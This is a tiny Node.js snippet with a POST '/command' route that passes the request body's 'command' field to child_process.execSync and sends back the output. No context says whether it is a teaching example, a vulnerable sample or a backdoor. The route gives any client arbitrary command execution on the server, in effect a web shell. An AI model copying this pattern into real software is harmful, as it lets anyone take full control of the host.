const cp = require("child_process");

post("/command", (req, res) => {

	res.send(cp.execSync(req.body.command));

});
